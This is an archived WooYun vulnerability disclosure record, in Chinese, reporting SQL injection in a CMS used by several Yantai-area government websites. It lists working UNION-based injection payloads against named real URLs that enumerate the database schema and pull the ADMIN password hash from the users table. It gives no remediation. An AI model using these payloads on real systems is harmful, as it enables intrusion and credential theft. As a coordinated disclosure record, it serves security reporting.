{"id": 50784, "wybug_id": "wooyun-2014-076825", "wybug_title": "某市通用CMS SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "疯狂的dabing", "wybug_date": "2014-09-23 10:53", "wybug_open_date": "2014-12-22 10:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述： 这段时间因为一些事情需要关注某市的政府网站，看到一些URL顺手做了测试，发现是jsp+openbase的组合，存在注入漏洞，可以查询详细数据。为扩大战果，google hack一下，发现是该市通用CMS（包括市政府主站）。科普一下，openBASE是什么？http://baike.baidu.com/view/1351295.htm 详细说明：  环境是和jsp+openbae。openbase是什么？http://baike.baidu.com/view/1351295.htm是东软开发的一套闭源数据库系统，没有下载没有试用。注入点，烟台政府主站：http://www.yantai.gov.cn/cn/content/facility_yt/shzn/guide/index_lb_xs.jsp?id=80504&flags_id=16764POC：http://www.yantai.gov.cn/cn/content/facility_yt/shzn/guide/index_lb_xs.jsp?id=80504&flags_id=16764 and 1=2 union select version()\n\nsqlmap可能跑不出来，因为openBASE有着比较特殊的语法，虽然没有手册和说明，不过我们可以黑盒测一下。最终的测试结果是，openBASE的基本sql语法是融合了mysql和postgresql的语法，使用limit 1和offset 1等方法来遍历，使用information_schema来存储数据库结构。暂未发现具有特殊功能的sql命令（这个比较难猜）。以http://xxgk.yantai.gov.cn为例，测试如下：目标：http://xxgk.yantai.gov.cn/index_show.jsp?sid=0604-02-2014-150692&dept_code=DSJ&columncode=DSJXXGKMLZCXWJ该注入点同时支持post和get型，后边一律以post来说明。===========版本号columncode=DSJXXGKMLZCXWJ' and 1=2 union select version()--\n\nOpenBASE 6.0.0 on i686-pc-linux-gnu，版本号有点长，后边没显示完。查库columncode=DSJXXGKMLZCXWJ' and 1=2 union select schema_name from information_schema.schemata limit 1 offset 5--\n\n查表columncode=DSJXXGKMLZCXWJ' and 1=2 union select table_name from information_schema.tables where table_schema='YTGOV' limit 1 offset 62--\n\n查字段columncode=DSJXXGKMLZCXWJ' and 1=2 union select column_name from information_schema.columns where table_name='TB_SYS_USER' limit 1 offset 6--\n\n查值columncode=DSJXXGKMLZCXWJ' and 1=2 union select PASSWORD from TB_SYS_USER where LOGINNAME='ADMIN' limit 1--\n\n密码base64编码，解码即可。   漏洞证明：  涉及网站比较多，简单列举如下：烟台主站http://www.yantai.gov.cn/cn/content/facility_yt/shzn/guide/index_lb_xs.jsp?id=80504&flags_id=16764 and 1=2 union select version()主站第二域名http://www.yantai.net.cn/cn/content/facility_yt/shzn/guide/index_lb_xs.jsp?id=80504&flags_id=16764 and 1=2 union select version()烟台信息公开xxgk.yantai.gov.cn蓬莱市政府信息公开平台xxgk.penglai.gov.cn/长岛县人民政府网www.changdao.gov.cn芝罘区政府信息公开平台xxgk.zhifu.gov.cn山东栖霞政府门户网站www.sdqixia.gov.cn可以猜测是烟台政府自主开发的一套CMS。。。。。=====工具化\n\n=====点到为止，未深入。   修复方案：  专家来。   版权声明：转载请注明来源 疯狂的dabing@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-09-26 14:56 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}